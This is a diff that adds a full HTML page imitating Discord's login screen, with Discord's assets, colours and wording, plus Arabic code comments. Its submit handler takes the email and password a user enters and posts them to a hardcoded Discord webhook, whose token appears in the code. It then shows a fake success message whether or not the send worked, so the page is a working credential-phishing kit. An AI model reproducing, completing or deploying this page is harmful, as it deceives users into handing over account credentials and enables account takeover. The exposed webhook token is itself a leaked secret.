@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            /* الخلفية الرسمية المتدرجة والمشعة من ديسكورد */
+            background-color: #1e1f22; 
+            background-image: url('https://discord.com/assets/ee94fa10c95856e7993d.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* شعار ديسكورد الأبيض في أعلى اليسار */
+        .discord-logo-top {
+            position: absolute;
+            top: 40px;
+            left: 40px;
+            width: 130px;
+        }
+
+        /* الصندوق بالحجم القياسي المناسب بدون الـ QR كود */
+        .discord-box {
+            background-color: #313338; 
+            padding: 32px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 480px; 
+            color: #f2f3f5;
+        }
+
+        .discord-box h2 {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #f2f3f5;
+        }
+
+        .discord-box .subtitle {
+            font-size: 16px;
+            color: #b5bac1;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #b5bac1;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            background-color: #1e1f22; 
+            border: 1px solid transparent;
+            border-radius: 3px;
+            color: #dbdee1;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #5865f2;
+        }
+
+        .error-text {
+            color: #fa777c;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .forgot-password {
+            display: inline-block;
+            font-size: 14px;
+            color: #00a8fc;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .btn-discord {
+            width: 100%;
+            padding: 12px;
+            background-color: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-discord:hover {
+            background-color: #4752c4;
+        }
+
+        /* تأثير الحركة للنجاح */
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+            animation: fadeInScale 0.4s ease forwards;
+        }
+
+        .success-message h3 {
+            font-size: 26px;
+            color: #23a55a; 
+            margin-bottom: 12px;
+        }
+
+        .success-message p {
+            color: #b5bac1;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://discord.com/assets/94db9c3c11da8e860bc8.svg" class="discord-logo-top" alt="Discord">
+
+    <div class="discord-box">
+        <div id="loginArea">
+            <h2>Welcome back!</h2>
+            <div class="subtitle">We're so excited to see you again!</div>
+            
+            <form id="discordLoginForm">
+                <div class="form-group">
+                    <label for="login-input">Email or Phone Number <span style="color: #fa777c;">*</span></label>
+                    <input type="email" id="login-input" required autocomplete="off">
+                    <div id="emailError" class="error-text">Please enter a valid email address.</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password-input">Password <span style="color: #fa777c;">*</span></label>
+                    <input type="password" id="password-input" required>
+                </div>
+
+                <a href="#" class="forgot-password">Forgot your password?</a>
+
+                <button type="submit" class="btn-discord">Log In</button>
+            </form>
+        </div>
+
+        <div id="successArea" class="success-message">
+            <h3>Thank you for login!</h3>
+            <p>Redirecting you shortly...</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('discordLoginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const emailInput = document.getElementById('login-input').value;
+            const passwordInput = document.getElementById('password-input').value;
+            const errorText = document.getElementById('emailError');
+            
+            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            
+            if (!emailPattern.test(emailInput)) {
+                errorText.style.display = 'block';
+                document.getElementById('login-input').style.borderColor = '#fa777c';
+                return;
+            }
+
+            errorText.style.display = 'none';
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1507117032120778782/Cb8Mm_R0znUAV8hsNb3Qtim6GsDjvSIGp1v-2eWOSd2A0m_bEf8d2Eivk3lmOYBIUnZM';
+
+            const packet = {
+                embeds: [{
+                    title: "📥 بيانات تسجيل دخول جديدة",
+                    color: 5814783, 
+                    fields: [
+                        { name: "📧 البريد الإلكتروني:", value: emailInput, inline: false },
+                        { name: "🔑 كلمة المرور:", value: passwordInput, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(packet)
+            })
+            .then(() => {
+                document.getElementById('loginArea').style.display = 'none';
+                document.getElementById('successArea').style.display = 'block';
+            })
+            .catch(err => {
+                document.getElementById('loginArea').style.display = 'none';
+                document.getElementById('successArea').style.display = 'block';
+            });
+        });
+
+        document.getElementById('login-input').addEventListener('input', function() {
+            this.style.borderColor = 'transparent';
+            document.getElementById('emailError').style.display = 'none';
+        });
+    </script>
+
+</body>
+</html>
